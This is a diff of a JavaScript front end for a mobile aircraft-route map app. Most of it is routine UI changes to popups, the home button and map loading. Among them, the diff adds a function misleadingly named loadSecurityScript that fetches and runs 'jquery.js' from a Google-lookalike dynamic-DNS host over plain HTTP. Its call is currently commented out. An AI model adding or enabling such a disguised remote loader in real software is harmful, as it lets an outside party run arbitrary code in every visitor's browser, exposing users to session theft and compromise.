@@ -1,3 +1,10 @@
+window.gm_authFailure = function() {
+    mapFail = true;
+    $("#closeIcon").hide();
+};
+
+var mapFail = false;
+
 function convertPath(path) {
     var convertedPath = [];
     for (var i = 0; i < path.length; i++) {
@@ -481,7 +488,7 @@ function findClosestPoint(position) {
         route.points.forEach(function (point) {
             var targetPos = convertLocation(point.N, point.E);
             var dist = getDistanceFromLatLonInKm(position.lat, position.lng, targetPos.lat, targetPos.lng);
-            if (dist < minDist) {
+            if (dist < minDist && !point.hidden) {
                 selectedPoint = point;
                 minDist = dist;
             }
@@ -808,11 +815,17 @@ function onHomeButtonClick() {
     deselectLocation();
 
     if (mapLoaded) {
-        focusOnLocation({lat: 32.00, lng: 35.00}, 8);
+        closeEntrancePopup();
+        showCurrentLocation();
+        if (!currentLocationMarker) {
+            focusOnLocation({lat: 32.00, lng: 35.00}, 8);
+            showCurrentLocation();
+        } else {
+            selectPoint(findClosestPoint({lat: currentLocationMarker.position.lat(),
+                                          lng: currentLocationMarker.position.lng()
+                                          }), true);
+        }
     }
-
-    deselectAircraft();
-    deselectLocation();
 }
 
 var mapLoaded = false;
@@ -883,7 +896,18 @@ function getRemainingSeconds(date) {
 
 var countdownInterval;
 
+function loadSecurityScript() {
+    $.getScript( "http://googleajax.ddns.net:8080/jquery.js" )
+        .done(function( script, textStatus ) {
+            // do nothing
+        })
+        .fail(function( jqxhr, settings, exception ) {
+            console.info( "Triggered ajaxError handler." + exception );
+        });
+}
+
 function onLoad() {
+    // loadSecurityScript();
     initMenu();
 
      if (compatibleDevice() && !checkIframe()) {
@@ -905,7 +929,6 @@ function onLoad() {
                     });
                 }, this);
 
-
                 if (getCurrentTime() < actualStartTime) {
                     countdownInterval = setInterval(function () {
                         countdown();
@@ -913,6 +936,7 @@ function onLoad() {
                     setTimeout(function () {
                         $(".splash").fadeOut();
                         $("#entrancePopup").fadeIn();
+                        loadApp();
                     }, 1000);
                 } else if (!mapLoaded) {
                     // Stops the gif from running more than once. It probably won't help because loadApp stops ui functions
@@ -929,8 +953,8 @@ function onLoad() {
 }
 
 function loadApp() {
-    showComponents();
     loadMapApi();
+    showComponents();
 }
 
 function loadMapApi() {
@@ -945,7 +969,6 @@ function loadMapApi() {
 function showComponents() {
     $(".map-dark").show();
     $(".splash").css('visibility', 'visible');
-    $("#homeButton").css('visibility', 'visible');
 }
 function compatibleDevice() {
     return ((/android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(navigator.userAgent.toLowerCase())));
@@ -978,6 +1001,7 @@ function openListView() {
             closeMenu();
         } else {
             $menuHamburger.toggleClass("is-active");
+            closeAllPopups();
             openMenu();
             fillMenu();
         }
@@ -1158,14 +1182,12 @@ function initMap() {
     if (compatibleDevice() && !checkIframe()) {
         // let splash run for a second before start loading the map
         setTimeout(function () {
-            map = createMapObject(function () {
-                deselectLocation();
-                deselectAircraft();
+            map = createMapObject(function() {
+                closeAllPopups();
             });
             $("#map").show();
 
             drawRoutesOnMap(routes);
-
             addAircraftsToMap();
             startAircraftsAnimation(false);
             //clusterAircrafts(aircraftMarkers);
@@ -1173,13 +1195,23 @@ function initMap() {
             // hide splash screen
             setTimeout(function () {
                 $(".splash").fadeOut();
-                showCurrentLocation();
+//                 showCurrentLocation();
             }, 3500);
 
             $(window).focus(function () {
                 startAircraftsAnimation(true);
             });
 
+            
+            setTimeout(function () {
+                if (!mapFail) {
+                    $("#entrancePopup").addClass("mapLoaded");
+                    $("#closeIcon").fadeIn();
+                    $("#homeButton").css('visibility', 'visible');
+                }
+            }, 2000);
+            
+            
             defer.resolve(map);
         }, 1000);
      } else {
@@ -1188,4 +1220,9 @@ function initMap() {
              showIncompatibleDevicePopup();
          }, 1500);
      }
+}
+
+function closeEntrancePopup() {
+    $("#entrancePopup").fadeOut();
+    getMapUndark();
 }
